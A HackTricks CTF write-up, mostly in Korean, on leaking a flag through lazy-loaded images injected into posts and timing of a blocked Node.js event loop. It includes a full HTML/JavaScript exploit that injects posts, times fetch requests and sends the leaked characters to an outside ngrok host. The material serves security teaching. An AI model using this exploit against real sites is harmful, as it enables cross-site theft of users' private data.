# Event Loop Blocking + Lazy images

{{#include ../../banners/hacktricks-training.md}}

In [**this exploit**](https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45), [**@aszx87410**](https://twitter.com/aszx87410)는 **lazy image side channel** 기법을 HTML 주입과 결합하여 **event loop blocking technique**을 사용해 문자를 유출합니다.

이것은 다음 페이지에서 이미 언급된 **CTF 챌린지**에 대한 **다른 익스플로잇**입니다. 챌린지에 대한 더 많은 정보는 다음을 참조하세요:

{{#ref}}
connection-pool-example.md
{{#endref}}

이 익스플로잇의 아이디어는 다음과 같습니다:

- 게시물은 알파벳 순으로 로드됩니다.
- **공격자**는 **"A"**로 시작하는 **게시물**을 **주입**할 수 있으며, 그러면 큰 **`<canvas`**와 같은 **HTML 태그**가 대부분의 **화면**을 채우고 최종 **`<img lazy` 태그**가 로드됩니다.
- 만약 **공격자가 "A"** 대신 **"z"**로 시작하는 동일한 게시물을 주입하면, **플래그**가 있는 **게시물**이 **먼저** 나타나고, 그 다음 **주입된** **게시물**이 초기 "z"와 함께 나타나며 **큰** **canvas**가 나타납니다. 플래그가 있는 게시물이 먼저 나타났기 때문에 첫 번째 캔버스가 화면을 모두 차지하고 최종 **`<img lazy`** 태그가 주입되었지만 **화면에 보이지 않게** 되어 **로드되지 않습니다**.
- 그런 다음, **봇이** 페이지에 **접속하는 동안**, **공격자**는 **fetch 요청**을 **보냅니다**.&#x20;
- 게시물에 주입된 **이미지**가 **로드되고** 있다면, 이러한 **fetch** 요청은 **더 오래 걸리게** 되므로 공격자는 **게시물이 플래그보다 앞에** 있다는 것을 알 수 있습니다 (알파벳 순으로).
- 만약 **fetch** 요청이 **빠르다면**, 이는 **게시물**이 **플래그** **뒤에** **알파벳 순으로** 있다는 것을 의미합니다.

코드를 확인해 봅시다:
```html
<!DOCTYPE html>
<html>
<!--
The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs event loop.
If images are loading, the request to "/" is slower, otherwise faster.
By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
We can use fetch to measure the request time.
-->
<body>
<button onclick="run()">start</button>

<!-- Inject post with payload -->
<form
id="f"
action="http://localhost:1234/create"
method="POST"
target="_blank">
<input id="inp" name="text" value="" />
</form>

<!-- Remove index -->
<form
id="f2"
action="http://localhost:1234/remove"
method="POST"
target="_blank">
<input id="inp2" name="index" value="" />
</form>

<script>
let flag = "SEKAI{"
const TARGET = "https://safelist.ctf.sekai.team"
f.action = TARGET + "/create"
f2.action = TARGET + "/remove"

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
// Function to leak info to attacker
const send = (data) => fetch("http://server.ngrok.io?d=" + data)
const charset = "abcdefghijklmnopqrstuvwxyz".split("")

// start exploit
let count = 0
setTimeout(async () => {
let L = 0
let R = charset.length - 1

// I have omited code here as apparently it wasn't necesary

// fallback to linerar since I am not familiar with binary search lol
for (let i = R; i >= L; i--) {
let c = charset[i]
send("try_" + flag + c)
const found = await testChar(flag + c)
if (found) {
send("found: " + flag + c)
flag += c
break
}
}
}, 0)

async function testChar(str) {
return new Promise((resolve) => {
/*
For 3350, you need to test it on your local to get this number.
The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
If starts with "A", the image should be loaded because it's in the threshold.
*/
// <canvas height="3350px"> is experimental and allow to show the injected
// images when the post injected is the first one but to hide them when
// the injected post is after the post with the flag
inp.value =
str +
'<br><canvas height="3350px"></canvas><br>' +
Array.from({ length: 20 })
.map((_, i) => `<img loading=lazy src=/?${i}>`)
.join("")
f.submit()

setTimeout(() => {
run(str, resolve)
}, 500)
})
}

async function run(str, resolve) {
// Open posts page 5 times
for (let i = 1; i <= 5; i++) {
window.open(TARGET)
}

let t = 0
const round = 30 //Lets time 30 requests
setTimeout(async () => {
// Send 30 requests and time each
for (let i = 0; i < round; i++) {
let s = performance.now()
await fetch(TARGET + "/?test", {
mode: "no-cors",
}).catch((err) => 1)
let end = performance.now()
t += end - s
console.log(end - s)
}
const avg = t / round
// Send info about how much time it took
send(str + "," + t + "," + "avg:" + avg)

/*
I get this threshold(1000ms) by trying multiple times on remote admin bot
for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
*/
const isFound = t >= 1000
if (isFound) {
inp2.value = "0"
} else {
inp2.value = "1"
}

// remember to delete the post to not break our leak oracle
f2.submit()
setTimeout(() => {
resolve(isFound)
}, 200)
}, 200)
}
</script>
</body>
</html>
```
{{#include ../../banners/hacktricks-training.md}}
